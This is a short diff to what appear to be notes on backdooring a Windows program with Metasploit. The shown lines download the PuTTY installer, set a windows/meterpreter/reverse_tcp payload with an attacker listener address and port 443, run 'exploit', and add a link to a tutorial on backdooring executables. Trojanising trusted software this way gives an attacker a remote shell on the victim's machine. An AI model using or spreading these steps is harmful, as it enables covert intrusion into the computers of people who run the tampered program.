@@ -1,4 +1,4 @@
-Bind windows payload
+Bind windows reverse_tcp payload
 
 wget http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
 
@@ -10,3 +10,8 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST 192.168.1.101
 set LPORT 443
 exploit
+
+
+
+More details
+https://www.offensive-security.com/metasploit-unleashed/backdooring-exe-files/
